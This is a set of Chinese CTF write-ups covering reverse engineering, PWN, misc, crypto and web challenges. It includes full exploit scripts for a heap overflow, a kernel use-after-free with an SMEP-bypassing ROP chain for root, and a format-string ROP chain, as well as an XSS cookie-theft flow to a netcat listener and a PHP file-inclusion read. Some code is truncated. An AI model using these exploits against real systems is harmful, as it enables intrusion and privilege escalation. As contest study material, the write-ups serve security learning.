使用jeb2的动态调试功能，把断点下到00000A7A函数的返回指令处，在手机中输入随意字符并点击确定，程序会断在返回指令处。 此时查看empty数组的值，发现疑似ASCII码的数字，转换过来就是flag flag：clo5er 17.溯源 类型：REVERSE 分值：200分 首先是输入长度为200字节，然后每两个字节转化为1个字节，得到100字节的输出。 根据后面的比较可以知道，这100字节分别为0-99这100个数。后面按照特定的顺序将0所在的位置和其上下左右的某个位置的数进行交换。验证经过交换后的数据刚好是0-99顺序排列。 大体思路是构造输入为0-99，得到交换后的数据，可以知道交换的映射关系，然后反过来根据输出为0-100，求输入。 data = '' for i in range(100): high = i/0x10 low = i%0x10 data += chr(65+high) + chr(65+low) print data #output of 0-99 f = open('./result', 'rb') d = f.read() f.close() from zio import * dict = {} for i in range(100): value = l32(d[i*4:i*4+4]) if value > 100: print hex(value) dict[value] = i data = '' for i in range(100): high = dict[i]/0x10 low = dict[i]%0x10 data += chr(65+high) + chr(65+low) print data 三、PWN 3.easyheap 类型：PWN 分值：200分 在edit的时候可以堆溢出，因为堆中有指针，因此只要覆盖指针即可任意地址读写。 因为开启了PIE，可以通过覆盖指针的最低字节进行泄露。 from threading import Thread from zio import * target = './easyheap' target = ('120.132.66.76', 20010) def interact(io): def run_recv(): while True: try: output = io.read_until_timeout(timeout=1) # print output except: return t1 = Thread(target=run_recv) t1.start() while True: d = raw_input() if d != '': io.writeline(d) def create_note(io, size, content): io.read_until('Choice:') io.writeline('1') io.read_until(':') io.writeline(str(size)) io.read_until(':') io.writeline(content) def edit_note(io, id, size, content): io.read_until('Choice:') io.writeline('2') io.read_until(':') io.writeline(str(id)) io.read_until(':') io.writeline(str(size)) io.read_until(':') io.write(content) def list_note(io): io.read_until('Choice:') io.writeline('3') def remove_note(io, id): io.read_until('Choice:') io.writeline('4') io.read_until(':') io.writeline(str(id)) def exp(target): io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green')) create_note(io, 0xa0, '/bin/shx00'.ljust(0x90, 'a')) #0 create_note(io, 0xa0, 'b'*0x90) #1 create_note(io, 0xa0, 'c'*0x90) #2 create_note(io, 0xa0, '/bin/shx00'.ljust(0x90, 'a')) #3 remove_note(io, 2) edit_note(io, 0, 0xb9, 'a'*0xb0+l64(0xa0)+'xd0') list_note(io) io.read_until('id:1,size:160,content:') leak_value = l64(io.readline()[:-1].ljust(8, 'x00')) base = leak_value - 0x3c4b78 system = base + 0x0000000000045390 free_hook = base + 0x00000000003C67A8 edit_note(io, 0, 0xc0, 'a'*0xb0+l64(0xa0)+l64(free_hook)) edit_note(io, 1, 8, l64(system)) print hex(system) print hex(free_hook) remove_note(io, 3) interact(io) exp(target) 9.BabyDriver 类型：pwn 分值：450分 0x00 前言 首先题目给了一套系统环境，利用qemu启动，nc连接比赛环境后会得到一个低权限的shell，同时题目给了一个babyDriver.ko，通过insmod将驱动加载进系统，先进行环境搭建，我们使用的是qemu，根据题目给的boot.sh可以得到qemu的启动命令。 qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic -smp cores=1,threads=1 -cpu kvm64,+smep 这里需要提的一点是很多人都是虚拟机里的Linux安装的qemu，这里有可能会报一个KVM的错误，这里需要开启虚拟机/宿主机的虚拟化功能。 http://p0.qhimg.com/t01b4e7c9581908c7d5.png 启动后我们可以进入当前系统，如果要调试的话，我们需要在qemu启动脚本里加一条参数-gdb tcp::1234 -S，这样系统启动时会挂起等待gdb连接，进入gdb，通过命令 Target remote localhost:1234 Continue 就可以远程调试babyDriver.ko了。 0x01 漏洞分析 通过IDA打开babyDriver.ko，这个驱动非常简单，实现的都是一些基本功能 关于驱动通信网上有很多介绍，这里我不多介绍了，这个驱动存在一个伪条件竞争引发的UAF漏洞，也就是说，我们利用open(/dev/babydev,O_RDWR)打开两个设备A和B，随后通过ioctl会释放掉babyopen函数执行时初始化的空间，而ioctl可以控制申请空间的大小。 __int64 __fastcall babyioctl(file *filp, __int64 command, unsigned __int64 arg, __int64 a4) { _fentry__(filp, command, arg, a4); v5 = v4; if ( (_DWORD)command == 65537 )//COMMAND需要为0x10001 { kfree(babydev_struct.device_buf);//释放初始化空间 LODWORD(v6) = _kmalloc(v5, 37748928LL);//申请用户可控空间 babydev_struct.device_buf = v6; babydev_struct.device_buf_len = v5; printk(\"alloc donen\", 37748928LL); result = 0LL; } else { printk(&unk_2EB, v4); result = -22LL; } return result; } 所以这里我们申请的buffer可控，再仔细看write和read函数，都做了严格的判断控制，似乎漏洞不在这里。 if ( babydev_struct.device_buf )//判断buf必须有值 { result = -2LL; if ( babydev_struct.device_buf_len > v4 )//判断malloc的空间大小必须大于用户读写空间大小 正如之前所说，这个漏洞是一个伪条件竞争引发的UAF，也就是说，我们通过open申请两个设备对象A和B，这时候释放设备对象A，通过close关闭，会发现设备对象B在使用设备对象A的buffer空间。这是因为A和B在使用同一个全局变量。 因此，释放设备A后，当前全局变量指向的空间成为释放状态，但通过设备对象B可以调用write/read函数读写该空间的内容。 我们就能构造一个简单的poc，通过open申请设备对象A和B，ioctl对A和B初始化一样大小的空间，通过kmalloc申请的空间初始化后都为0，随后我们通过close的方法关闭设备对象A，这时候再通过write，向设备对象B的buffer写入。 首先会将buffer的值交给rdi，并且做一次检查。 .text:00000000000000F5 ; 7: if ( babydev_struct.device_buf ) .text:00000000000000F5 mov filp, cs:babydev_struct.device_buf .text:00000000000000FC test rdi, rdi .text:00000000000000FF jz short loc_125 rdi寄存器存放的就是buffer指针。 可以看到，指针指向的空间的值已经不是初始化时候覆盖的全0了。 当前目标缓冲区内已经由于释放导致很多内容不为0，这时候，我们同样可以通过read的方法读到其他地址，获取地址泄露的能力。 在test之后泄露出来了一些额外的值，因此可以通过read的方法来进行info leak。 0x02 Exploit 既然这片空间是释放的状态，那么我们就可以在这个空间覆盖对象，同时，我们可以通过对设备B的write/read操作，达到对这个内核对象的读写能力，ling提到了tty_struct结构体，这是Linux驱动通信一个非常重要的数据结构，关于tty_struct结构体的内容可以去网上搜到。 于是整个问题就比较明朗了，我们可以通过这个漏洞来制造一个hole，这个hole的大小可以通过ioctl控制，我们将其控制成tty_struct结构体的大小0x2e0，随后close关闭设备A，通过open(/dev/ptmx)的方法申请大量的tty_struct结构体，确保这个结构体能够占用到这个hole，之后通过对设备B调用write/read函数完成对tty_struct结构体的控制。 首先我们按照上面思路，编写一个简单的poc。 fd = open(\"/dev/babydev\",O_RDWR); fd1 = open(\"/dev/babydev\",O_RDWR); //init babydev_struct printf(\"Init buffer for tty_struct,%dn\",sizeof(tty)); ioctl(fd,COMMAND,0x2e0); ioctl(fd1,COMMAND,0x2e0); 当close(fd)之后，我们利用open的方法覆盖tty_struct，同时向tty_struct开头成员变量写入test数据，退出时会由于tty_struct开头成员变量magic的值被修改导致异常。 接下来，我们只需要利用0CTF中一道很有意思的内核题目KNOTE的思路，在tty_struct的tty_operations中构造一个fake oprations，关键是修改其中的ioctl指针，最后达成提权效果。 首先，我们需要利用设备B的read函数来获得占位tty_struct的头部结构，然后才是tty_operations。 当然，通过启动命令我们可以看到，系统开启了smep，我们需要构造一个rop chain来完成对cr4寄存器的修改，将cr4中smep的比特位置0，来关闭smep。 unsigned long rop_chain[] = { poprdiret, 0x6f0, // cr4 with smep disabled native_write_cr4, get_root_payload, swapgs, 0, // dummy iretq, get_shell, user_cs, user_rflags, base + 0x10000, user_ss}; 解决了SMEP，我们就能完成最后的提权了。至此，我们可以将整个利用过程按照如下方式完成，首先利用设备A和B，close设备A，释放buffer，同时设备B占用同一个buffer空间，用tty_struct对象占位，然后设备B的write/read函数可以完成对tty_struct的读写。 至此，我们要构造fake struct来控制rip。 我们通过覆盖tty_struct中的tty_operations，来将fake tty_operations的ioctl函数替换掉，改成stack pivot，之后我们调用ioctl函数的时候相当于去执行stack pivot，从而控制rip。 当然，这个ioctl的设备对象不能是设备B，而是需要tty_struct喷射时所使用的的设备对象，tty_struct的喷射使用open方法完成。 for(i=0;i由于tty_operations->ioctl被修改，转而去执行stack pivot，从而获得控制rip的能力，这样通过stack pivot，就可以进入我们rop chain了。 之后我们通过get root payload来完成提权。 root_payload(void) { commit_creds(prepare_kernel_cred(0)); } 由于这道题目的环境没有KASLR，所以内核地址都没有变化，可以直接写死，当然，如果内核地址有变化也没有关系，通过设备B的read方法可以读到内核地址，算出基址，再加上偏移，一样可以得到commit_cred和prepare_kernel_cred的地址。 最后通过get shell完成提权，获得root权限。 18.NotFormat 类型：PWN 分值：250分 明显的格式化，在print之后直接调用exit退出了。和0ctf的easyprintf有点类似，参考http://blog.dragonsector.pl/2017/03/0ctf-2017-easiestprintf-pwn-150.html。与easyprintf不同的是这个题目是静态编译的，程序中没有system函数，因此构造了一个裸的rop去获取shell。 from threading import Thread import operator from zio import * target = './NotFormat' target = ('123.59.71.3', 20020) def interact(io): def run_recv(): while True: try: output = io.read_until_timeout(timeout=1) # print output except: return t1 = Thread(target=run_recv) t1.start() while True: d = raw_input() if d != '': io.writeline(d) def format_write(writes, index): printed = 0 payload = '' for where, what in sorted(writes.items(), key=operator.itemgetter(1)): delta = (what - printed) & 0xffff if delta > 0: if delta >16)&0xffff writes[2] = pop_rdi_ret&0xffff writes[3] = (pop_rdi_ret>>16)&0xffff writes[4] = (fake_rsp+0x18)&0xffff writes[5] = ((fake_rsp+0x18)>>16)&0xffff writes[6] = read_buff&0xffff writes[7] = (read_buff>>16)&0xffff d = format_write(writes, 13+6) print len(d) d += '%'+str(fake_rsp-0x20)+'s' d = d.ljust(13*8, 'a') d += l64(malloc_hook) + l64(malloc_hook+2) d += l64(fake_rsp) + l64(fake_rsp+2) d += l64(fake_rsp+8) + l64(fake_rsp+10) d += l64(fake_rsp+0x10) + l64(fake_rsp+0x12) print len(d) io.gdb_hint() io.read_until('!') io.writeline(d) pop_rax_ret = 0x00000000004C2358 pop_rdx_rsi_ret = 0x0000000000442c69 syscall = 0x000000000043EE45 rop = l64(pop_rdi_ret)+l64(fake_rsp+12*8) rop+= l64(pop_rdx_rsi_ret) + l64(0) + l64(0) rop+= l64(pop_rax_ret) + l64(0x3b) rop += l64(syscall) rop += '/bin/shx00' rop += '/bin/shx00' rop += '/bin/shx00' io.writeline(rop) interact(io) exp(target) 三、MISC 4.传感器1 类型：MISC 分值：100分 差分曼彻斯特 from Crypto.Util.number import * id1 = 0x8893CA58 msg1 = 0x3EAAAAA56A69AA55A95995A569AA95565556 msg2 = 0x3EAAAAA56A69AA556A965A5999596AA95656 print hex(msg1 ^ msg2).upper() s = bin(msg2)[6:] print s r=\"\" tmp = 0 for i in xrange(len(s)/2): c = s[i*2] if c == s[i*2 - 1]: r += '1' else: r += '0' print hex(int(r,2)).upper() 6.warmup 类型：MISC 分值：100分 看到一个莫名其妙的文件open_forum.png，猜测是已知明文，后来google搞不到原图，官方的hint 猜测是盲水印工具：https://github.com/chishaxie/BlindWaterMark python27 bwm.py decode fuli.png fuli2.png res.png 12.badhacker 类型：MISC 分值：200分 首先看到pcap中IRC交流 意思就是在这个服务器上找文件，然后找改动的地方，把行号排序计算md5 This server 就是irc服务器 扫描端口 发现 http://202.5.20.47:8923 这个服务是开的 这里有个脑洞，服务器不支持host为ip的请求，只能讲host改为其他的，如提示的misc.ichunqiu.com 所以，在操作系统Host表中添加DNS，将misc.ichunqiu.com解析成http://202.5.20.47:8923/ 然后对这个服务器进行目录爆破，爆出mysql.bak 这个文件有点意思，需要找改动的地方。脑洞就是在unix操作系统中的换行是n，而在windows中的换行是rn，所以，找改动的地方。找到3处，交了不对。 于是扩大搜索范围，搜索r，发现有8处 将其行号排序，然后计算md5即可。 两个脑洞，一个是服务器拒绝host为IP的请求，另一个是unix和windows换行符号。 13.传感器2 类型：MISC 分值：250分 对#0X02 4D 88 45 AB F3 41 19 除了最后一位是校验位，其他都是控制命令和ID号，直接CRC8就可以 更改88 45 AB F3为 再计算就可以了 上图是ID为88 45 AB F3的 15.embarrass 类型：MISC 分值：300分 四、Crypto 11.partial 类型：Crypto 分值：300分 Coppersmith Attack 已知部分p，其实给的有点多，给576bit的就足够了 n=0x985CBA74B3AFCF36F82079DE644DE85DD6658A2D3FB2D5C239F2657F921756459E84EE0BBC56943DE04F2A04AACE311574BE1E9391AC5B0F8DBB999524AF8DF2451A84916F6699E54AE0290014AFBF561B0E502CA094ADC3D9582EA22F857529D3DA79737F663A95767FDD87A9C19D8104A736ACBE5F4A25B2A25B4DF981F44DB2EB7F3028B1D1363C3A36F0C1B9921C7C06848984DFE853597C3410FCBF9A1B49C0F5CB0EEDDC06D722A0A7488F893D37996F9A92CD3422465F49F3035FEA6912589EFCFB5A4CF9B69C81B9FCC732D6E6A1FFCE9690F34939B27113527ABB00878806B229EC6570815C32BC2C134B0F56C21A63CA535AB467593246508CA9F9 p=0xBCF6D95C9FFCA2B17FD930C743BCEA314A5F24AE06C12CE62CDB6E8306A545DE468F1A23136321EB82B4B8695ECE58B763ECF8243CBBFADE0603922C130ED143D4D3E88E483529C820F7B53E4346511EB14D4D56CB2B714D3BDC9A2F2AB655993A31E0EB196E8F63028F9B29521E9B3609218BA0000000000000000000000000 p_fake = p+0x10000000000000000000000000 pbits = 1024 kbits = pbits-576 pbar = p_fake & (2^pbits-2^kbits) print \"upper %d bits (of %d bits) is given\" % (pbits-kbits, pbits) PR. = PolynomialRing(Zmod(n)) f = x + pbar x0 = f.small_roots(X=2^kbits, beta=0.4)[0] # find root = n^0.4 print x0 + pbar flag{4_5ing1e_R00T_cAn_chang3_eVeryth1ng} "},"articals/xihulunjian2019.html":{"url":"articals/xihulunjian2019.html","title":"2019西湖论剑预选赛","keywords":"","body":"2019西湖论剑预选赛 题目类型： 类型 年份 难度 官方赛事题 2019 中 题目下载： 链接: https://pan.baidu.com/s/1B9Coqdmh8wYnYo3eW3MOMg 提取码: bagw 网上公开WP: https://mp.weixin.qq.com/s/rlSyABoulRKygPmwfcUuXA https://www.anquanke.com/post/id/176136/ https://www.jianshu.com/p/c14970447ddd https://blog.csdn.net/qq_41420747/article/details/89076214 本站备份WP： 感谢：冷逸、fIappy[暂时未联系到作者] Web 作者：冷逸 babyt3 题目地址：http://61.164.47.198:10000/ 打开地址，发现提示： include $_GET['file'] 目测为文件包含，尝试读index.php的源码， http://61.164.47.198:10000/?file=php://filter/read=convert.base64-encode/resource=index.php 还原后如下： 发现提示，其实右击查看源代码也可以看到.. base64解码后得到dir.php 读dir.php http://61.164.47.198:10000/?file=php://filter/read=convert.base64-encode/resource=dir.php 得知该文件可以列目录，尝试列目录 http://61.164.47.198:10000/dir.php?dir=/ 这样得到ffffflag_1s_Her4文件 使用file读取，得到flag http://61.164.47.198:10000/?file=php://filter/read=convert.base64-encode/resource=/ffffflag_1s_Her4 Breakout 题目地址：http://61.164.47.198:10001/ 打开后是一个登录界面，随意输入账号密码，即可登录进去，登录后界面如下： 第一个子页面可以留言评论,第二个子页面是将某个链接发送给管理员,管理员会携带cookie查看该页面,第三个子页面是执行命令和清除留言,尝试直接输入命令执行,提示说要有管理员权限才可以执行命令.到这里,很显然这是一个xss漏洞盗取管理员cookie然后登录管理员账号去执行命令. 使用如下payload绕过过滤 然后在report哪里提交 http://61.164.47.198:10001/main.php 有个验证码，爆破脚本如下 import hashlib def md5(key): m = hashlib.md5() m.update(key.encode('utf-8')) return m.hexdigest() for i in range(1000000000): if md5(str(i))[0:6] == ' b0f446 ': print(i) break 自己服务器监听 nc -lvvp 8000 可得到cookie 然后执行命令，使用ceye外带flag 猜猜flag是什么 题目地址： http://61.164.47.198:10002/ dir扫描得到 发现.DS_Store 泄露 脱下来 发现e10adc3949ba59abbe56e057f20f883e目录 继续扫描，发现git文件 使用Githack下载后得到三个文件 BackupForMySite.zip index.php lengzhu.jpg 用明文攻击解开压缩包BackupForMySite.zip，得到里面的code 注：只能使用bindzip进行压缩，反正我7-zip压缩的失败 或者使用rbkcrack进行明文攻击 解开后得到code is 后面是一个随机串 带入首页得到一串数字 然后使用使用php_mt_seed：你的数字 然后访问/flag/得到的数字.txt 得到flag 二.Crypto： 作者：fIappy [暂时未联系到作者] 题目: 哈夫曼之谜题目链接:https://xpro-adl.91ctf.com/userdownload?filename=1904055ca752d3c1f20.zip&type=attach&feature=custom题目描述:打开压缩包后得到一个文本文件,内容如下 11000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110 a:4 d:9 g:1 f:5 l:1 0:7 5:9 {:1 }:1 根据题目名哈夫曼之谜,很容易想到是哈夫曼编码与解码的问题题目分析:对于哈夫曼编码的介绍就不多说,每个计算机专业的同学应该上数据结构课都学过,具体可以参考百度科:https://baike.baidu.com/item/%E5%93%88%E5%A4%AB%E6%9B%BC%E7%BC%96%E7%A0%81/1719730?fr=aladdin 对于这个题目,第一行的01串显然就是flag编码后的结果,被编码的元素是左边一列的字母,他们对应的权重在第二列,对于一个哈夫曼编码问题,首先需要根据元素的权重构建哈夫曼树,然后对要编码的字符串按照一定的算法进行编码,然后再按照一定的算法进行解码.这些算法我们不需要知道详细过程,做题时可完全没有必要自己实现一个哈夫曼编码,太费时间,所以我们可以参考网上实例代码进行修改即可 参考的哈夫曼编码代码的博客地址:https://blog.csdn.net/qq_40328281/article/details/80412359 代码分析:要修改的地方其实就是最大的编码长度maxn,text长度n,权重数据weight和text数组. #include \"pch.h\" #include const int maxvalue = 200; const int maxbit = 200; const int maxn = 200; #include \"stdio.h\" #include \"stdlib.h\" using namespace std; struct haffnode { char ch; int weight; int flag; int parent; int leftchild; int rightchild; }; struct code { int bit[maxn]; int start; int weight; char ch; }; void haffman(int weight[], char text[], int n, haffnode hafftree[]) { int j, m1, m2, x1, x2, i; for (i = 0; i 运行结果: 三.re 作者：fIappy [暂时未联系到作者] 1.junk_instruction 题目文件:https://xpro-adl.91ctf.com/userdownload?filename=1904055ca752e532f14.zip&type=attach&feature=custom 从题目名字看出,这是一个含有垃圾指令例如花指令的程序. 而且从文件图标来看,显然是一个mfc写的程序. 打开程序发现需要输入flag,然后点击check来检测是否正确.可以猜测是将我们的输入进行各种加密处理然后和程序中的某个字符串(可能是动态生成的)比较,得出是否输入正确. 通过xspy工具:https://github.com/lynnux/xspy/tree/master/xspydll 找到check按钮的处理函数: 查看该函数 从这个check函数的逻辑看,应该是402600对输入进行判断,下面2个if分支对应于输入正确和错误的弹窗.跟进402600,发现该函数后面又几段花指令,例如这个: call %+5直到下面的retn都是花指令,找到这几段类似的代码,全部nop掉即可. 然后f5反编译: v2 = (const WCHAR *)sub_401570(&a1); v17 = (void *)sub_4030A0(v2); v13 = v17; LOBYTE(v70) = 1; v3 = (void *)sub_401570(v17); sub_403000((int)&v60, v3); LOBYTE(v70) = 3; sub_4012A0(&v18); v19 = (char *)unknown_libname_1(&v60); v54 = v19; v16 = v19 + 1; v54 += strlen(v54); v14 = ++v54 - (v19 + 1); v12 = v54 - (v19 + 1); v68 = 0; memset(&v69, 0, 0x27u); strncpy(&v68, v19, v54 - (v19 + 1)); if ( sub_402AF0(&v68) ) // 判断输入长度 { v57 = 0; v59 = 0; LABEL_7: v58 = v59; } else { v63 = 1919252337;//这里是rc4密钥 v64 = 1769306484; v65 = 28783; v66 = 0; memset(&v67, 0, 0xF5u); v61 = 0; memset(&v62, 0, 0xFFu); v7 = 0; memset(&v8, 0, 0x1FFu); v53 = (const char *)&v63; v10 = (int *)((char *)&v63 + 1); v53 += strlen(v53); v9 = ++v53 - ((const char *)&v63 + 1); v6 = v53 - ((const char *)&v63 + 1); v5 = &v63; sub_402CA0(&v61); v56 = &v68; v15 = &v69; v56 += strlen(v56); v11 = ++v56 - &v69; sub_402E80(v20, &v61, &v68, v56 - &v69); for ( i = 31; i >= 0; --i ) { if ( *(&v68 + i) != *((char *)&savedregs + i + (_DWORD)&loc_4026B7 - 4204867) ) { v59 = 0; goto LABEL_7; } } v58 = 1; } LOBYTE(v70) = 0; sub_403060((int)&v60); v70 = -1; sub_4012A0(&a1); return v58; } 通过分析程序先将输入进行了逆序,再使用rc4加密. rc4数组初始化:该函数也是被花指令的,使用相同方法处理即可 void __cdecl sub_402CA0(_BYTE *a1, int a2, unsigned int a3) { char v3; // ST1B_1 int v4; // [esp+8h] [ebp-114h] signed int i; // [esp+10h] [ebp-10Ch] signed int j; // [esp+10h] [ebp-10Ch] char v7; // [esp+18h] [ebp-104h] char v8; // [esp+19h] [ebp-103h] v4 = 0; v7 = 0; memset(&v8, 0, 0xFFu); for ( i = 0; i 进行比较判断 加密函数:该函数也是被花指令的,使用相同方法处理即可 int __stdcall sub_402E80(int a1, int a2, unsigned int a3) { int result; // eax char v4; // ST1B_1 int v5; // [esp+Ch] [ebp-18h] unsigned int i; // [esp+10h] [ebp-14h] int v7; // [esp+14h] [ebp-10h] v7 = 0; v5 = 0; for ( i = 0; i 而check函数的这段正是用于比较的数组 最种解密如下: import base64 key = \"qwertyuiop\" res = [0xfa,0x45,0xd0,0x9e,0,0xc,0x9f,0x82,0x57,0x89,0xe5,0xf7,0xb0,0x64,0x76 ,0xdd,0xaf,0xff,0x7d,0x91,0x16,0xcb,0x3e,0x6e,0x7e,0x19,0xdd,0xc8,0x26,0xd0,0xd6,0x5b] res = res[::-1] tmp = \"\" for i in res: tmp += chr(i) tmp = base64.b64encode(tmp) print tmp ff = \"f250e3d75820847d427f3af11a783379\" flag = ['*']*32 for i in range(16): flag[i] = ff[31-i] flag[31-i] = ff[i] print \"flag{%s\"%(\"\".join(flag))+'}' W9bQJsjdGX5uPssWkX3/r912ZLD35YlXgp8MAJ7QRfo= flag{973387a11fa3f724d74802857d3e052f} 2.Testre 题目文件链接: https://xproadl.91ctf.com/userdownload?filename=1904055ca752e746df2.zip&type =attach&feature=custom ida打开文件,main函数如下 __int64 __fastcall main(__int64 a1, char **a2, char **a3) { void *ptr; // ST10_8 __int64 v5; // [rsp+18h] [rbp-28h] char v6; // [rsp+20h] [rbp-20h] int v7; // [rsp+3Ch] [rbp-4h] v7 = 0; v5 = 256LL; sub_400D00((__int64)&v6, 0x11uLL); ptr = malloc(0x100uLL); sub_400700(ptr, &v5, (__int64)&v6, 0x10uLL); free(ptr); return 0LL; } 跟进sub_400D00,发现是个接受输入的函数 跟进sub_400700: for ( i = 0LL; i 这部分将一个字符串和输入进行了异或加密,但后面会发现,并没有用到 while ( v20 >= 6; v21 /= 58; v27 /= v9; if ( !j ) break; } ++v20; v18 = j; } 这个循环才是主菜,我们暂时不去详细分析算法过程,比较复杂,但是可以看到常量58,被模了一下和被除了一下.继续看下面 if ( *v30 > n + v17 - j ) { if ( v17 ) // 不会执行到这里面,又是干扰分析 { c = 61; memset(encode_input, '1', v17); memset(v26, c, v17); } v20 = v17; while ( j 到这里发现有2个数组,分别是 .rodata:0000000000400EB0 byte_400EB0 db '1' ; DATA XREF: sub_400700+446↑r .rodata:0000000000400EB1 a23456789abcdef db '23456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',0 .rodata:0000000000400EEB align 10h .rodata:0000000000400EF0 ; char byte_400EF0[] .rodata:0000000000400EF0 byte_400EF0 db 'A' ; DATA XREF: sub_400700+464↑r .rodata:0000000000400EF1 aBcdefghijklmno db 'BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',0 显然一个是base64编码表,一个是base58编码表,最开始把base58编码表看成了是数字加所有字母,浪费大量时间分析. 仔细观察代码,其实进行base64编码的过程是针对v26,但是v26变量指向的内存完全没有和最后的比较产生关系,所以这都是干扰做题的 最后观察比较语句,提取出最终串:D9cS9N9iHjMLTdA8YSMRMp 对其进行base58解码就是flag: import base58 as bs bs.b58decode('D9cS9N9iHjMLTdA8YSMRMp') #output: base58_is_boring base58通过pip install base58即可安装 3.easyCpp 题目链接： https://xproadl.91ctf.com/userdownload?filename=1904055ca752e6ae1c5.zip&type =attach&feature=custom 这个要求对 c++的 stl 比较熟悉 直接来到main: for ( i = 0; i >::push_back(&our_input, &v25[4 * i]); } for ( j = 0; j >::push_back(&fib_list, &input_begin); } 接受输入和生成斐波那契数列 std::vector>::push_back(&v20, v25); v7 = std::back_inserter>>(&v20); input_end = std::vector>::end(&our_input); input_begin = std::vector>::begin(&our_input); v9 = __gnu_cxx::__normal_iterator>>::operator+(&input_begin, 1LL);// 对input每个元素加1 std::transform>>,std::back_insert_iterator>>,main::{lambda(int)#1}>( v9, input_end, v7, v25); std::vector>::vector(&v23, input_end, v10); std::vector>::end(&v20); std::vector>::begin(&v20); std::accumulate>>,std::vector>,main::{lambda(std::vector>,int)#2}>((unsigned __int64)&input_begin); std::vector>::operator=(&v21, &input_begin); std::vector>::~vector(&input_begin); std::vector>::~vector(&v23); if ( (unsigned __int8)std::operator!=>(&v21, &fib_list) )// 必须相同 { puts(\"You failed!\"); exit(0); } transform是把v9的每个元素通过匿名函数进行转换,结果存入v20 进入transform: v4 = (int *)__gnu_cxx::__normal_iterator>>::operator*(&input_begin_1); v11 = main::{lambda(int)#1}::operator() const((_DWORD **)&v29, *v4);// 把输入的vector和v29相加 v5 = std::back_insert_iterator>>::operator*(&v24_backinsert); std::back_insert_iterator>>::operator=(v5, &v11); __gnu_cxx::__normal_iterator>>::operator++(&input_begin_1); std::back_insert_iterator>>::operator++(&v24_backinsert); 再进入 main::{lambda(int)#1}::operator() const((_DWORD *)&v29, v4);: __int64 __fastcall main::{lambda(int)#1}::operator() const(_DWORD **a1, int a2) { return (unsigned int)(**a1 + a2); } 这下就知道这个就是把输入和输入的第一个元素相加 接着看std::accumulate,这个程序的std::accumulate和c++的不一样不知道是不是ida识别错误,打开看这个函数,内部还是有个匿名函数,静态分析比较复杂,我们通过动态调试来分析 根据 std::vector>::operator=(&v25, &input_begin); std::vector>::~vector(&input_begin); std::vector>::~vector(&v27); if ( (unsigned __int8)std::operator!=>(&v25, &fib_list) )// 必须相同 我们需要分析v25的内容,通过下断std::vector>::~vector(&input_begin);再查看v25: gef➤ x/10gx $rsp+0x90 0x7fffc6f61660: 0x0000000002007f10 0x0000000002007f50 0x7fffc6f61670: 0x0000000002007f50 0x0000000000000000 0x7fffc6f61680: 0x0000000000000000 0x0000000000000000 0x7fffc6f61690: 0x0000000000000000 0x0000000000000000 0x7fffc6f616a0: 0x0000000000000000 0x0000000000000000 地址为0x0000000002007f10, 再查看堆: …….] Chunk(addr=0x2007e30, size=0x50, flags=PREV_INUSE) [0x0000000002007e30 00 00 00 00 00 00 00 00 24 00 00 00 23 00 00 00 ……..$…#…] Chunk(addr=0x2007e80, size=0x50, flags=PREV_INUSE) [0x0000000002007e80 20 7e 00 02 00 00 00 00 24 00 00 00 23 00 00 00 ~……$…#…] Chunk(addr=0x2007ed0, size=0x40, flags=PREV_INUSE) [0x0000000002007ed0 00 00 00 00 00 00 00 00 23 00 00 00 22 00 00 00 ……..#…”…] Chunk(addr=0x2007f10, size=0x50, flags=PREV_INUSE) [0x0000000002007f10 27 00 00 00 26 00 00 00 25 00 00 00 24 00 00 00 gef➤ x/16wx 0x0000000002007f10 0x2007f10: 0x00000027 0x00000026 0x00000025 0x00000024 0x2007f20: 0x00000023 0x00000022 0x00000021 0x00000020 0x2007f30: 0x0000001f 0x0000001e 0x0000001d 0x0000001c 0x2007f40: 0x0000001b 0x0000001a 0x00000019 0x0000000c 发现这个是把输入进行了反向. 总结一下加密流程 1.接受16个数字输入 2.计算斐波那契数列前16项 3.把16个数字输入从第二个元素开始,都加上第一个元素 4.将3的结果反向 5.将4的结果和2的结果比较,完全相同则输入的是flag 解密脚本: a = [1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987] c = a[::-1] d = [987] for i in range(1,len(c)): d.append(c[i]-987) import pprint pprint.pprint(d) 输出: [987, -377, -610, -754, -843, -898, -932, -953, -966, -974, -979, -982, -984, -985, -986, -986] getflag: from pwn import * p = process('./easyCpp') input_ = [987, -377, -610, -754, -843, -898, -932, -953, -966, -974, -979, -982, -984, -985, -986, -986] for i in input_: p.sendline(str(i)) p.interactive() "},"articals/shiyanbar_web.html":{"url":"articals/shiyanbar_web.html","title":"实验吧web部分","keywords":"","body":"实验吧Web部分 题目类型： 类型 年份 难度 网上练习题 无 易 题目下载： 暂无 网上公开WP： https://www.cnblogs.com/sch01ar/p/7996159.html https://www.0x002.com/2019/百道CTF刷题记录(一)/ 本站备份WP: 作者：Yunen 简介 最近在刷CTF题，主攻Web，兼职Misc Shiyanbar 0x01 简单的登陆题 简单概括： 考点： %00截断正则 CBC字节翻转攻击 难度： 难 WP：https://blog.csdn.net/include_heqile/article/details/79942993 解题过程： F12查看响应头，发现返回tips访问test.php文件得到源代码： base64_decode('\".base64_encode($plain).\"') can't unserialize\"); $sql=\"select * from users limit \".$info['id'].\",0\"; $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)>0 or die(mysqli_error($link))){ $rows=mysqli_fetch_array($result); echo 'Hello!'.$rows['username'].''; } else{ echo 'Hello!'; } }else{ die(\"ERROR!\"); } } } if(isset($_POST['id'])){ $id = (string)$_POST['id']; if(sqliCheck($id)) die(\"sql inject detected!\"); $info = array('id'=>$id); login($info); echo 'Hello!'; }else{ if(isset($_COOKIE[\"iv\"])&&isset($_COOKIE['cipher'])){ show_homepage(); }else{ echo ' Login Form input id to login '; } }?> 代码分析： sqliCheck函数负责过滤sql注入 get_random_iv 生成16位随机数(Asicc范围在0~255内)iv 漏洞原因：aes-128-cbc加密存在CBC翻转攻击(不理解，暂时跳过) 0x02 后台登录 简单概括： 考点：md5()函数16位二进制格式绕过，md5(\"ffifdyop\",True)得到的加密字符串为'or'6(注：or '数字+字母' 等价于or true) 难度：易 